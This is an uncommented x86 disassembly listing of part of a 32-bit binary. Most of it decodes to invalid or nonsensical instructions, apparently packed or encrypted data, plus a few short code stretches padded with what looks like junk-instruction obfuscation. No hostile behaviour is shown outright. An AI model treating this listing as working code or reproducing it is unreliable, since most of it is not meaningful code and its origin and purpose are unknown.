  4071b7:	mov    eax,eax
  4071b9:	jne    0x407239
  4071bb:	cs ja  0x4071e4
  4071be:	push   ecx
  4071bf:	mov    DWORD PTR [ecx],esi
  4071c1:	jb     0x407193
  4071c3:	mov    BYTE PTR [ebx-0x51d818f1],cl
  4071c9:	xor    BYTE PTR [ebx+0x2a8b6dbf],0x99
  4071d0:	mov    dh,0x53
  4071d2:	pop    es
  4071d3:	aam    0x1e
  4071d5:	and    DWORD PTR [ecx-0x32e8956a],esi
  4071db:	mov    ch,0x75
  4071dd:	stos   DWORD PTR es:[edi],eax
  4071de:	push   edi
  4071df:	dec    BYTE PTR [edx-0x4218d785]
  4071e5:	or     esp,esi
  4071e7:	dec    esi
  4071e8:	leave  
  4071e9:	aam    0xbf
  4071eb:	xchg   esp,eax
  4071ec:	das    
  4071ed:	cmp    BYTE PTR [eax],al
  4071ef:	mov    dh,0xf7
  4071f1:	out    dx,al
  4071f2:	out    0x41,al
  4071f4:	mov    ds:0x6b6da7d0,eax
  4071f9:	mov    ds:0x34e0a3e7,al
  4071fe:	lds    esi,FWORD PTR [ecx]
  407200:	test   eax,0xe7ccfb94
  407205:	add    dh,BYTE PTR [eax]
  407207:	leave  
  407208:	sar    BYTE PTR gs:[ebp+0x56],1
  40720c:	popf   
  40720d:	add    al,0xd9
  40720f:	cdq    
  407210:	(bad)  [ebp-0x69503d29]
  407216:	repz popf 
  407218:	cmp    ebp,0x29
  40721b:	or     ebx,edi
  40721d:	(bad)  
  40721e:	cwde   
  40721f:	out    0xfb,eax
  407221:	out    0x29,eax
  407223:	push   ebp
  407224:	aas    
  407225:	(bad)  
  407227:	push   edx
  407228:	das    
  407229:	jmp    DWORD PTR [ebx+0x3f]
  40722c:	jl     0x40723d
  40722e:	add    eax,0xf1086127
  407233:	push   ecx
  407234:	and    BYTE PTR [edx+edx*1],ch
  407237:	cmp    eax,0x71b0251d
  40723c:	jnp    0x40725f
  40723e:	ins    DWORD PTR es:[edi],dx
  40723f:	and    eax,DWORD PTR [esi-0x6a]
  407242:	push   ds
  407243:	scas   eax,DWORD PTR es:[edi]
  407244:	clc    
  407245:	rcr    DWORD PTR [ecx+ebp*1+0x4d197f66],cl
  40724c:	cmp    dl,al
  40724e:	xchg   ebx,eax
  40724f:	xchg   edx,eax
  407250:	sub    dh,bh
  407252:	popf   
  407253:	dec    ebp
  407254:	iret   
  407255:	data16 and al,BYTE PTR [ecx-0x74]
  407259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40725a:	(bad)  
  40725b:	push   es
  40725c:	jns    0x4072d4
  40725e:	cmp    al,0x35
  407260:	xchg   ebp,eax
  407261:	out    dx,eax
  407262:	aam    0x19
  407264:	fmul   st,st(7)
  407266:	lock jb 0x40724f
  407269:	sbb    BYTE PTR [ecx],al
  40726b:	out    0xa2,eax
  40726d:	mov    bh,BYTE PTR [ebp+0x30a77d09]
  407273:	inc    ebx
  407274:	outs   dx,BYTE PTR ds:[esi]
  407275:	rol    BYTE PTR [esi-0x5],cl
  407278:	push   esi
  407279:	xchg   dx,ax
  40727b:	jae    0x407207
  40727d:	pop    edi
  40727e:	(bad)  
  40727f:	sbb    cl,BYTE PTR ds:0x912d073d
  407285:	(bad)  
  407286:	sub    BYTE PTR [edx],0xe5
  407289:	push   ebp
  40728a:	sub    dl,BYTE PTR [esi]
  40728c:	inc    eax
  40728d:	mov    ch,0x4
  40728f:	ins    BYTE PTR es:[edi],dx
  407290:	cmp    al,0x5a
  407292:	mov    ah,0xbf
  407294:	int3   
  407295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407296:	icebp  
  407297:	outs   dx,DWORD PTR ds:[esi]
  407298:	pop    esi
  407299:	clc    
  40729a:	icebp  
  40729b:	cwde   
  40729c:	loope  0x4072ba
  40729e:	ds stos DWORD PTR es:[edi],eax
  4072a0:	add    ch,BYTE PTR ds:0xdffeab66
  4072a6:	cli    
  4072a7:	pop    esi
  4072a8:	and    eax,0x78ac0478
  4072ad:	mov    edi,DWORD PTR [eax]
  4072af:	jmp    0x266e:0xaada0b6e
  4072b6:	and    al,0x74
  4072b8:	aaa    
  4072b9:	imul   ebx,DWORD PTR [ebp+0x36],0xffffff8f
  4072bd:	or     BYTE PTR [esi-0x42c8c750],0xca
  4072c4:	fistp  DWORD PTR [edi-0x20]
  4072c7:	pop    esi
  4072c8:	xor    al,0xfc
  4072ca:	mov    BYTE PTR ds:0x258cf6b3,bl
  4072d0:	push   es
  4072d1:	inc    ebp
  4072d2:	sbb    DWORD PTR [ebx+0x1d2f34c3],eax
  4072d8:	lahf   
  4072d9:	mov    bh,0x2a
  4072db:	mov    ds:0x3030feaf,eax
  4072e0:	(bad)  
  4072e1:	icebp  
  4072e2:	test   eax,ebp
  4072e4:	mov    esp,0x6eaac02f
  4072e9:	dec    edx
  4072ea:	scas   al,BYTE PTR es:[edi]
  4072eb:	stos   BYTE PTR es:[edi],al
  4072ec:	jne    0x407359
  4072ee:	add    BYTE PTR [eax+0x4dba32b9],ah
  4072f4:	lock ja 0x4072a7
  4072f7:	(bad)  [esi+0x16]
  4072fa:	inc    edi
  4072fb:	push   esp
  4072fc:	repz cmp esp,DWORD PTR [ebp-0x4]
  407300:	das    
  407301:	pop    esi
  407302:	sbb    dl,dl
  407304:	jae    0x407329
  407306:	pop    ss
  407307:	out    0xb4,eax
  407309:	mov    cl,BYTE PTR [ecx]
  40730b:	inc    ebp
  40730c:	adc    ebp,esi
  40730e:	pop    ss
  40730f:	fmulp  st(5),st
  407311:	arpl   WORD PTR [ebx+0x630b8994],si
  407317:	mov    cl,0x1
  407319:	xlat   BYTE PTR ds:[ebx]
  40731a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40731b:	mov    ch,0xcb
  40731d:	inc    esi
  40731e:	loop   0x407346
  407320:	xchg   ebx,ebx
  407322:	jmp    FWORD PTR [ebp+0x2b]
  407325:	nop
  407326:	rcr    BYTE PTR [esi-0x1df30b68],1
  40732c:	test   al,dl
  40732e:	call   0x36c2:0xaf2e1541
  407335:	(bad)  
  407336:	fwait
  407337:	pop    edi
  407338:	sbb    eax,0xcf38bd55
  40733d:	inc    ebp
  40733e:	xor    BYTE PTR [ebx],bl
  407340:	xor    dl,BYTE PTR [ecx]
  407342:	adc    BYTE PTR [ebp-0x742ee2bb],ch
  407348:	inc    ebp
  407349:	hlt    
  40734a:	add    DWORD PTR ds:0x42fdd1,0x42e803
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fdfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e80f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fdfd,0x0
  407384:	mov    eax,ds:0x42fdfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fdfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fdfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e55f
  4073a2:	cmp    DWORD PTR ds:0x42fdfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fdfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fdfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fdfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e228,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e807,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	xor    BYTE PTR [edi-0x300807a5],ah
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x4073ad
  407408:	add    BYTE PTR [esi],bl
  40740a:	jmp    0x5f89:0x7d2d6276
  407411:	mov    ds:0x4735c69b,al
  407416:	cdq    
  407417:	dec    ebp
  407418:	mov    cl,0x63
  40741a:	retf   0xe918
  40741d:	aad    0xe9
  40741f:	xchg   esi,eax
  407420:	fadd   st,st(2)
  407422:	outs   dx,DWORD PTR ds:[esi]
  407423:	pop    edi
  407424:	repnz ffree st(5)
  407427:	jge    0x4073ff
  407429:	add    cl,BYTE PTR [ebx+0x66287e3]
  40742f:	pop    ecx
  407430:	daa    
  407431:	dec    edx
  407432:	sub    eax,esi
  407434:	and    al,0x9d
  407436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407437:	fdivrp st(3),st
  407439:	(bad)  
  40743b:	dec    eax
  40743c:	arpl   WORD PTR [ecx-0x5ebde9dc],sp
  407442:	stos   DWORD PTR es:[edi],eax
  407443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407444:	(bad)  
  407445:	fidiv  DWORD PTR [ebp-0x492bf87f]
  40744b:	dec    eax
  40744c:	loopne 0x407479
  40744e:	xchg   edx,eax
  40744f:	or     al,BYTE PTR [edi-0x6579d7a5]
  407455:	int3   
  407456:	mov    dl,0x70
  407458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407459:	pop    ebp
  40745a:	ss push esp
  40745c:	add    dh,BYTE PTR [esi+0x2582eaac]
  407462:	mov    cl,0x1f
  407464:	aas    
  407465:	test   eax,0x13538e8e
  40746a:	add    dl,BYTE PTR [edi]
  40746c:	test   ch,dh
  40746e:	stos   BYTE PTR es:[edi],al
  40746f:	in     al,0xfc
  407471:	call   0x97378feb
  407476:	ja     0x4074b4
  407478:	adc    eax,0xacd7532b
  40747d:	sub    eax,0xa9193f3f
  407482:	pop    es
  407483:	retf   
  407484:	shr    esp,cl
  407486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407487:	sub    bh,BYTE PTR [eax-0xbcd9e29]
  40748d:	dec    esp
  40748f:	sbb    ebx,DWORD PTR [eax]
  407491:	xchg   edi,eax
  407492:	popf   
  407493:	mov    es,WORD PTR [esi-0x40]
  407496:	dec    esi
  407497:	or     edx,DWORD PTR [eax-0x3d2fe884]
  40749d:	jg     0x4074b4
  40749f:	(bad)  
  4074a0:	cdq    
  4074a1:	inc    edi
  4074a2:	icebp  
  4074a3:	push   edx
  4074a4:	jns    0x407519
  4074a6:	cwde   
  4074a7:	ins    BYTE PTR es:[edi],dx
  4074a8:	retf   
  4074a9:	mov    ah,0x25
  4074ab:	jmp    DWORD PTR [esi+edi*2-0x1b]
  4074af:	(bad)  
  4074b0:	mov    ecx,0x3934b773
  4074b5:	iret   
  4074b6:	xor    esi,ebp
  4074b8:	fidivr DWORD PTR [edi+0x32]
  4074bb:	mov    eax,ds:0x6ca95809
  4074c0:	jae    0x407480
  4074c2:	jno    0x40753b
  4074c4:	aad    0xcf
  4074c6:	ds jae 0x40750e
  4074c9:	aaa    
  4074ca:	ror    DWORD PTR [edi-0x659a29a1],0xac
  4074d1:	cld    
  4074d2:	fs stc 
  4074d4:	inc    eax
  4074d5:	shl    BYTE PTR [edx-0x7f739e85],1
  4074db:	popf   
  4074dc:	mov    ecx,0x3fb0312d
  4074e1:	les    edx,FWORD PTR [esi+0x6ab84159]
  4074e7:	or     esp,ebx
  4074e9:	mov    ss,eax
  4074eb:	shr    BYTE PTR [esi],cl
  4074ed:	inc    ecx
  4074ee:	adc    ebx,DWORD PTR [ecx-0x1e]
  4074f1:	xor    ecx,DWORD PTR [ebp+esi*1-0x21]
  4074f5:	imul   esi,DWORD PTR [eax+0x5f6fd371],0xe4909e31
  4074ff:	fnstsw WORD PTR [ebx+0xeb6aa21]
  407505:	add    eax,DWORD PTR [ebx]
  407507:	cli    
  407508:	clc    
  407509:	xor    edi,ecx
  40750b:	lods   eax,DWORD PTR ds:[esi]
  40750c:	out    dx,al
  40750d:	dec    esp
  40750e:	idiv   DWORD PTR [edi]
  407510:	mov    dl,0x8b
  407512:	fild   WORD PTR [ecx]
  407514:	mov    esi,0x8f43a402
  407519:	add    BYTE PTR [esi],cl
  40751b:	mov    esp,0xb4c44952
  407520:	out    dx,eax
  407521:	js     0x407560
  407523:	jmp    0x4074dd
  407525:	add    ebx,edx
  407527:	xchg   esi,eax
  407528:	mov    ch,0xbe
  40752a:	adc    esi,esp
  40752c:	mov    ds,WORD PTR [eax+0x9]
  40752f:	push   eax
  407530:	jns    0x40759a
  407532:	mov    al,0xea
  407534:	icebp  
  407535:	push   ebx
  407536:	das    
  407537:	inc    ecx
  407538:	push   0xb6f30aa1
  40753d:	xchg   ebx,eax
  40753e:	or     ch,BYTE PTR [edi-0x704a7b06]
  407544:	sahf   
  407545:	lds    ebx,FWORD PTR [ebp-0x2d30a1d9]
  40754b:	add    DWORD PTR [ebp+esi*2-0x729c9803],ebx
  407552:	mov    dl,BYTE PTR [ebp+edi*2+0x4b43b8d6]
  407559:	cmp    ebp,DWORD PTR [eax-0x42ebd533]
  40755f:	pushf  
  407560:	sub    al,0x78
  407562:	jae    0x40753e
  407564:	xchg   esi,eax
  407565:	inc    esi
  407566:	shl    eax,cl
  407568:	dec    eax
  407569:	imul   edx,DWORD PTR [edx+0x51],0x776d6fd
  407570:	into   
  407571:	arpl   bx,dx
  407573:	push   es
  407574:	in     al,0x13
  407576:	lock pop ss
  407578:	jnp    0x4075a0
  40757a:	or     al,0x56
  40757c:	leave  
  40757d:	ror    BYTE PTR [ebx+0x94dee11],1
  407583:	add    esp,DWORD PTR [edx-0x1c]
  407586:	adc    BYTE PTR [ecx+0x11da46fc],bh
  40758c:	xchg   esi,eax
  40758d:	adc    edi,DWORD PTR [ebp-0x3ac19865]
  407593:	jo     0x4075a5
  407595:	fwait
  407596:	push   ebx
  407597:	fiadd  WORD PTR [edi]
  407599:	(bad)  
  40759a:	sbb    ebx,edi
  40759c:	xor    ecx,ebx
  40759e:	pop    edx
  40759f:	mov    ebp,0x81a90e
  4075a4:	call   0x8edb:0xc41a04b1
  4075ab:	popf   
  4075ac:	pop    es
  4075ad:	stc    
  4075ae:	push   0xffffff80
  4075b0:	xor    al,0xd3
  4075b2:	fldcw  WORD PTR [esi-0x5e4948ab]
  4075b8:	outs   dx,DWORD PTR ds:[esi]
  4075b9:	fdiv   QWORD PTR [eax+0x6f]
  4075bc:	sar    ebp,cl
  4075be:	adc    eax,0x6f474ae9
  4075c4:	sahf   
  4075c5:	in     eax,dx
  4075c6:	rcr    BYTE PTR [edi+0x676aae64],0x33
  4075cd:	fdivrp st(1),st
  4075cf:	push   ebp
  4075d0:	mov    ds:0xbd793576,al
  4075d5:	push   cs
  4075d6:	jl     0x4075e2
  4075d8:	push   esp
  4075d9:	or     BYTE PTR [ebx-0x5eaff16c],dh
  4075df:	es and al,0x68
  4075e2:	add    dl,BYTE PTR [ecx]
  4075e4:	push   edx
  4075e5:	and    bl,cl
  4075e7:	fwait
  4075e8:	mov    ch,0x81
  4075ea:	ins    DWORD PTR es:[edi],dx
  4075eb:	inc    edx
  4075ec:	add    al,0xd3
  4075ee:	dec    ebx
  4075ef:	jmp    0x407661
  4075f1:	call   0xdea6:0x75f5e32
  4075f8:	xchg   esp,eax
  4075f9:	(bad)  
  4075fb:	and    eax,DWORD PTR [edx-0x5d1fd5cd]
  407601:	icebp  
  407602:	fist   DWORD PTR [edi-0x2b60d47b]
  407608:	sti    
  407609:	pop    esi
  40760a:	xchg   BYTE PTR [ecx],bh
  40760c:	mov    DWORD PTR [esi-0x2db04876],edx
  407612:	stc    
  407613:	jecxz  0x40764a
  407615:	cvtps2pd xmm7,QWORD PTR [ecx-0x1b]
  407619:	jmp    0x85eb:0xd6879165
  407620:	inc    ecx
  407621:	rol    DWORD PTR [ebx],0xfa
  407624:	ret    0xca90
  407627:	push   ebp
  407628:	inc    eax
  407629:	dec    eax
  40762a:	add    BYTE PTR [eax],dl
  40762c:	lahf   
  40762d:	retf   0x119
  407630:	lods   al,BYTE PTR ds:[esi]
  407631:	push   ecx
  407632:	(bad)  
  407633:	push   esi
  407634:	sub    BYTE PTR [esi+0x578bf0b],0xe3
  40763b:	cli    
  40763c:	pop    esp
  40763d:	xchg   ax,ax
  40763f:	fwait
  407640:	js     0x4075e9
  407642:	jp     0x40769b
  407644:	test   DWORD PTR [eax+0x531b0b37],ebp
  40764a:	rol    DWORD PTR [ebx],cl
  40764c:	cmp    esp,DWORD PTR [ebp-0x71c0ec36]
  407652:	js     0x407638
  407654:	call   DWORD PTR ds:0xf2120c4e
  40765a:	xor    ebx,DWORD PTR [esi+0x741e5cf7]
  407660:	mov    al,ds:0xa460ef9a
  407665:	mov    ah,0xb3
  407667:	(bad)  
  407668:	jae    0x407673
  40766a:	sub    DWORD PTR ds:0x6410e021,0x55e000a3
  407674:	adc    eax,edx
  407676:	imul   edi,DWORD PTR [esp+ecx*2-0x25cd9ad3],0x68
  40767e:	ds jp  0x4076d6
  407681:	xchg   esi,eax
  407682:	mov    ah,0xcd
  407684:	and    al,0x2d
  407686:	mov    bl,0xc9
  407688:	or     DWORD PTR [eax],0x27
  40768b:	add    al,0x45
  40768d:	out    0xfa,al
  40768f:	sbb    edi,esp
  407691:	push   ecx
  407692:	pop    edi
  407693:	mov    WORD PTR [ebx-0x7b],gs
  407696:	ins    DWORD PTR es:[edi],dx
  407697:	dec    esi
  407698:	fs (bad) 
  40769a:	mov    eax,0x4263053b
  40769f:	pop    edi
  4076a0:	xor    BYTE PTR [esp+esi*8+0x4f],ah
  4076a4:	ja     0x407699
  4076a6:	aad    0x65
  4076a8:	cmp    bl,BYTE PTR [esi+0x5]
  4076ab:	repnz dec ebx
  4076ad:	sahf   
  4076ae:	mov    eax,ds:0x82404dcf
  4076b3:	or     DWORD PTR [edx+edx*1+0x47],edx
  4076b7:	ss mov ebx,?
  4076ba:	and    BYTE PTR [eax],cl
  4076bc:	pushf  
  4076bd:	pop    ds
  4076be:	hlt    
  4076bf:	sub    BYTE PTR [ebp-0x1bc8d6f6],al
  4076c5:	dec    eax
  4076c6:	xchg   esi,eax
  4076c7:	add    ah,BYTE PTR [edx]
  4076c9:	inc    ebx
  4076ca:	and    bh,BYTE PTR [ebx+0x72ccab9d]
  4076d0:	add    al,0xa9
  4076d2:	adc    eax,0x2dc2aca5
  4076d7:	fnstcw WORD PTR [esi]
  4076d9:	arpl   WORD PTR [edi+0xf],bp
  4076dc:	cmp    al,0x9d
  4076de:	(bad)  
  4076e0:	push   ds
  4076e1:	call   0x89c9:0xfb388720
  4076e8:	mov    ebp,DWORD PTR [ebx]
  4076ea:	xchg   ch,dh
  4076ec:	inc    ecx
  4076ed:	fsub   st(6),st
  4076ef:	mov    edx,0xaba65179
  4076f4:	xor    DWORD PTR [ebx],esp
  4076f6:	mov    cl,0x3a
  4076f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076f9:	sub    ch,BYTE PTR [ebx+0x17]
  4076fc:	in     al,dx
  4076fd:	mov    ss,WORD PTR [eax+0x8eebfd0]
  407703:	push   edx
  407704:	xor    eax,0x70e6e2eb
  407709:	sahf   
  40770a:	fs dec eax
  40770c:	cli    
  40770d:	popf   
  40770e:	push   0xb73f72a
  407713:	mov    edx,gs
  407715:	lea    ebp,[ecx]
  407717:	aas    
  407718:	xchg   ecx,eax
  407719:	push   ebp
  40771a:	sub    ebp,edi
  40771c:	pop    ecx
  40771d:	xor    BYTE PTR [edi+esi*1+0x4250c7ed],0xc9
  407725:	push   ebp
  407726:	inc    esi
  407727:	ja     0x40775b
  407729:	adc    al,ah
  40772b:	aaa    
  40772c:	mov    al,0x6a
  40772e:	inc    esi
  40772f:	sbb    DWORD PTR [eax+ebp*2],0x35
  407733:	psubsb mm3,QWORD PTR [edi-0x66]
  407737:	mov    eax,DWORD PTR [ebp-0x24]
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e21c,0x42fe09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fdd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e7ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fdf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e80f,0x42e7eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e7ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e803,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fde5,0x42fe6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	dec    eax
  4077da:	rol    BYTE PTR [edx-0x46],cl
  4077dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x40781a
  4077e6:	jo     0x40778c
  4077e8:	aam    0x85
  4077ea:	push   eax
  4077eb:	stos   DWORD PTR es:[edi],eax
  4077ec:	adc    cl,BYTE PTR [ecx+0x9f09247]
  4077f2:	fxch   st(3)
  4077f4:	mov    BYTE PTR [ecx+edx*2-0x25],cl
  4077f8:	sti    
  4077f9:	sbb    dh,dh
  4077fb:	stc    
  4077fc:	cdq    
  4077fd:	loopne 0x4077b8
  4077ff:	iret   
  407800:	shl    DWORD PTR [esi],cl
  407802:	adc    edx,DWORD PTR [ecx]
  407804:	fnstenv [ecx-0x13471a51]
  40780a:	add    BYTE PTR [eax],ah
  40780c:	call   0xca81853b
  407811:	popa   
  407812:	jecxz  0x407813
  407814:	je     0x407860
  407816:	inc    edi
  407817:	jle    0x407862
  407819:	xor    edi,edi
  40781b:	xor    ebx,DWORD PTR [eax+0x7a1a3501]
  407821:	repz pop ebp
  407823:	(bad)  
  407824:	pop    esi
  407825:	sahf   
  407826:	sub    esp,DWORD PTR [ebx+0x6f]
  407829:	retf   0xaf32
  40782c:	outs   dx,DWORD PTR ds:[esi]
  40782d:	imul   edi,DWORD PTR [ecx+0x25db51b3],0x8a132ab
  407837:	or     ax,0x79b
  40783b:	aad    0xc7
  40783d:	cwde   
  40783e:	or     ah,BYTE PTR [ecx+0x32]
  407841:	or     DWORD PTR [eax-0x44a949fe],edi
  407847:	sbb    bh,ah
  407849:	and    eax,0x97de99cb
  40784e:	dec    ebp
  40784f:	test   DWORD PTR [ebp-0x5ce6ec99],0x1fce9843
  407859:	add    al,0xa
  40785b:	cdq    
  40785c:	sbb    dl,ah
  40785e:	jl     0x407851
  407860:	mov    dl,BYTE PTR [esi-0x51baf013]
  407866:	mov    edx,0x521d04e9
  40786b:	test   al,0xa2
  40786d:	mov    edx,0x27529eb7
  407872:	int    0x9a
  407874:	aas    
  407875:	add    edx,DWORD PTR [ecx-0x29b756fb]
  40787b:	outs   dx,BYTE PTR ds:[esi]
  40787c:	icebp  
  40787d:	stos   BYTE PTR es:[edi],al
  40787e:	sbb    ebp,DWORD PTR ds:0x552d2291
  407884:	das    
  407885:	aaa    
  407886:	add    eax,0x4199a666
  40788b:	mov    dh,0x26
  40788d:	(bad)  
  40788e:	fadd   QWORD PTR [eax-0x605c6eb]
  407894:	aas    
  407895:	mov    DWORD PTR [ecx],ebx
  407897:	test   al,0xba
  407899:	shl    BYTE PTR [esi-0x1f8dd200],cl
  40789f:	stc    
  4078a0:	xor    al,0xe5
  4078a2:	ins    DWORD PTR es:[edi],dx
  4078a3:	mov    edx,0x2b6ea3ed
  4078a8:	daa    
  4078a9:	inc    edx
  4078aa:	jne    0x4078cd
  4078ac:	dec    ebx
  4078ad:	or     BYTE PTR [ecx+0x47],al
  4078b0:	mov    esi,0x65fc53f6
  4078b5:	ficomp WORD PTR [esi+edx*8+0x73]
  4078b9:	ja     0x40788d
  4078bb:	xchg   ch,dl
  4078bd:	xchg   edx,eax
  4078be:	clc    
  4078bf:	mov    al,ds:0x74521f8e
  4078c4:	lahf   
  4078c5:	(bad)  
  4078c6:	xor    DWORD PTR [esi-0x4439de38],ebp
  4078cc:	mov    eax,0x4839e813
  4078d1:	loope  0x407868
  4078d3:	sbb    BYTE PTR [esi-0x9],bl
  4078d6:	lods   al,BYTE PTR ds:[esi]
  4078d7:	bound  edx,QWORD PTR [edx+0x21]
  4078da:	jbe    0x407941
  4078dc:	aaa    
  4078dd:	and    ch,BYTE PTR [edi+0x3c]
  4078e0:	sbb    ebx,DWORD PTR [ecx+0x50]
  4078e3:	scas   eax,DWORD PTR es:[edi]
  4078e4:	lahf   
  4078e5:	ret    
  4078e6:	fcomp  QWORD PTR fs:[eax+0x4649c147]
  4078ed:	sbb    dl,BYTE PTR [eax]
  4078ef:	jnp    0x40793a
  4078f1:	push   ebx
  4078f2:	jae    0x407971
  4078f4:	xchg   ecx,eax
  4078f5:	fldenv [edi+0x205758b0]
  4078fb:	add    al,0x29
  4078fd:	or     bl,bh
  4078ff:	outs   dx,DWORD PTR ds:[esi]
  407900:	ins    BYTE PTR es:[edi],dx
  407901:	add    eax,0x766fb3fa
  407906:	(bad)  
  407908:	les    edi,FWORD PTR [eax+edx*8-0x6382334c]
  40790f:	fdivr  QWORD PTR [ecx-0x6052dd33]
  407915:	push   ss
  407916:	(bad)  
  407918:	cmp    al,0xda
  40791a:	repnz rep outs dx,BYTE PTR ds:[esi]
  40791d:	arpl   WORD PTR [ebx],sp
  40791f:	sbb    eax,0x893ad6b9
  407924:	sti    
  407925:	scas   eax,DWORD PTR es:[edi]
  407926:	xchg   ecx,eax
  407927:	(bad)  
  407928:	je     0x40792e
  40792a:	leave  
  40792b:	or     BYTE PTR [edi+0xae7948c],al
  407931:	mov    dl,0xab
  407933:	ins    DWORD PTR es:[edi],dx
  407934:	push   ds
  407935:	or     eax,0x28
  407938:	dec    ecx
  407939:	xor    eax,0x5ff78b9b
  40793e:	imul   edi,DWORD PTR [ebx],0x1359f1bc
  407944:	out    0xb3,al
  407946:	mov    dl,0x46
  407948:	dec    esi
  407949:	je     0x4078f5
  40794b:	test   DWORD PTR [edi-0x6668b0ff],eax
  407951:	pop    eax
  407952:	fldcw  WORD PTR [esi+ecx*8-0x73]
  407956:	mov    DWORD PTR [esi],ebx
  407958:	clc    
  407959:	loop   0x407960
  40795b:	sbb    DWORD PTR [edi+0x3c],eax
  40795e:	es sahf 
  407960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407961:	xchg   ecx,eax
  407962:	cs test eax,0xbca9e0dd
  407968:	push   eax
  407969:	scas   eax,DWORD PTR es:[edi]
  40796a:	test   al,0x84
  40796c:	xor    eax,0xe0e11183
  407971:	push   ecx
  407972:	js     0x4079b0
  407974:	cmp    eax,DWORD PTR [esi+0x2c]
  407977:	pop    ss
  407978:	and    DWORD PTR [edx+0x5d],ebp
  40797b:	mov    DWORD PTR [eax+0x39],edi
  40797e:	out    dx,al
  40797f:	push   eax
  407980:	aas    
  407981:	add    ch,BYTE PTR [ebp-0x58]
  407984:	mov    bl,0xa7
  407986:	jne    0x407933
  407988:	sti    
  407989:	lea    ebx,[ebp-0x26]
  40798c:	popa   
  40798d:	int3   
  40798e:	ror    BYTE PTR [edx+0x4b],cl
  407991:	jle    0x40795b
  407993:	xchg   edx,eax
  407994:	imul   ecx,DWORD PTR cs:[esi],0x2d
  407998:	in     al,dx
  407999:	pop    eax
  40799a:	fdiv   QWORD PTR [ebx+0x794257a]
  4079a0:	imul   esi,DWORD PTR [edi],0xcfc26269
  4079a6:	mov    dh,0x92
  4079a8:	xor    BYTE PTR [eax*4+0x3c969878],dl
  4079af:	and    eax,0xca73acb
  4079b4:	mov    esi,0x1e0cf42b
  4079b9:	call   0x6400bc98
  4079be:	out    dx,al
  4079bf:	popa   
  4079c0:	inc    ebx
  4079c1:	(bad)  
  4079c2:	xchg   ecx,eax
  4079c3:	xchg   edi,eax
  4079c4:	pop    eax
  4079c5:	push   0xffffffaf
  4079c7:	(bad)  
  4079c8:	loopne 0x407987
  4079ca:	push   esi
  4079cb:	jbe    0x407976
  4079cd:	loop   0x407a45
  4079cf:	popf   
  4079d0:	inc    ebx
  4079d1:	test   al,0x9c
  4079d3:	shl    DWORD PTR [bp+di+0x12bf],1
  4079d8:	xchg   DWORD PTR [ebx-0x7e99903e],ebx
  4079de:	push   0xd030b333
  4079e3:	lock shl DWORD PTR [ecx+0x5e],1
  4079e7:	mov    esp,0xb206d7bd
  4079ec:	jbe    0x407a3a
  4079ee:	mov    eax,ss
  4079f0:	lods   eax,DWORD PTR ds:[esi]
  4079f1:	jmp    0x407a18
